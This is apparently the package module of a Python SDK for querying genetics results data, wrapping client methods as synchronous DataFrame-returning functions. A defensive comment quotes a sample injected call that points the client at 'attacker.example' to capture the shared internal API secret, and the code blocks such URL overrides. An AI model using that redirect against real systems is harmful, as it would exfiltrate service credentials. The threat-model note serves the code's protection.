"""The `genetics` SDK — importable data access for scripts.

    import genetics_mcp_server.sdk as genetics

    df = genetics.credible_sets(gene="IL7R")
    df.filter(pl.col("pip") > 0.5)

A script needs no knowledge of HTTP, tokens, base URLs or result envelopes: endpoints and
credentials come from the environment (GENETICS_API_URL, BIGQUERY_API_URL,
INTERNAL_API_SECRET), every function returns a polars DataFrame, and a failed request
raises GeneticsError instead of returning a success flag to check. Endpoints are read from
the environment ONLY and cannot be set from a script — see the note above `_URL_SETTINGS`.

Nothing here imports the chat backend, the MCP server or the databases, so the package can
be installed into a sandbox image on its own.

Every function is also available as an awaitable method on `GeneticsClient` for callers
that already have an event loop.
"""

import functools
import inspect
from typing import Any

from genetics_mcp_server.sdk import _runner
from genetics_mcp_server.sdk.client import GeneticsClient, parse_region
from genetics_mcp_server.sdk.errors import GeneticsError, GeneticsUsageError

_FUNCTIONS = (
    "credible_sets",
    "colocalization",
    "exome",
    "gene_burden",
    "asm_qtl",
    "open_chromatin",
    "peak_to_gene",
    "variant_effect",
    "mpra",
    "mpra_pip_concordance",
    "variant_annotation",
    "gene_annotations",
    "expression",
    "gene_disease",
    "summary_stats",
    "ld",
    "search",
    "lookup_phenotype_names",
    "get_dataset_display_names",
    "normalize_gene_symbols",
    "sql",
    "schema",
    "resources",
    "datasets",
)

_client: GeneticsClient | None = None

# a script may not redirect the client's endpoints. The client authenticates every request
# with INTERNAL_API_SECRET, so a caller-supplied base URL turns one injected line —
#     genetics.configure(api_base_url="http://attacker.example/api")
#     genetics.expression("APOE")
# — into the shared secret that authenticates to BOTH results-api and db-api. URLs
# therefore come from the environment only (GENETICS_API_URL, GENETICS_PUBLIC_API_URL,
# BIGQUERY_API_URL), which the sandbox controls and the script does not.
#
# This is a MITIGATION, not the answer. Per genetics-results-suite
# docs/code-execution-security.md, a script that can `import` the SDK can also read
# os.environ, so the SDK must eventually carry a short-lived scoped token instead of
# INTERNAL_API_SECRET at all — tasks genetics-results-suite-4h6.9 / .14.
_URL_SETTINGS = ("api_base_url", "public_api_url", "bigquery_api_url")


def configure(**kwargs: Any) -> None:
    """Reserved for future non-URL configuration.

    Endpoint URLs are deliberately NOT configurable: see the note above `_URL_SETTINGS`.
    They are read from the environment, so a sandbox script never has to call this.
    """
    rejected = sorted(k for k in kwargs if k in _URL_SETTINGS)
    if rejected:
        raise GeneticsUsageError(
            f"endpoint URLs cannot be set from a script ({', '.join(rejected)}); "
            f"they come from the environment because the client carries internal credentials"
        )
    if kwargs:
        raise GeneticsUsageError(f"unknown settings: {', '.join(sorted(kwargs))}")


def get_client() -> GeneticsClient:
    """The process-wide client. Created on first use so importing costs no connections."""
    global _client
    if _client is None:
        _client = GeneticsClient()
    return _client


def close() -> None:
    """Close the shared client's HTTP connections."""
    global _client
    if _client is not None:
        client, _client = _client, None
        _runner.run(client.close())


def _make_sync(name: str):
    method = getattr(GeneticsClient, name)

    @functools.wraps(method)
    def wrapper(*args: Any, **kwargs: Any):
        return _runner.run(getattr(get_client(), name)(*args, **kwargs))

    # drop `self` so help()/inspect show what a script actually passes
    signature = inspect.signature(method)
    wrapper.__signature__ = signature.replace(
        parameters=list(signature.parameters.values())[1:]
    )
    return wrapper


for _name in _FUNCTIONS:
    globals()[_name] = _make_sync(_name)
del _name

__all__ = [
    *_FUNCTIONS,
    "GeneticsClient",
    "GeneticsError",
    "GeneticsUsageError",
    "close",
    "configure",
    "get_client",
    "parse_region",
]
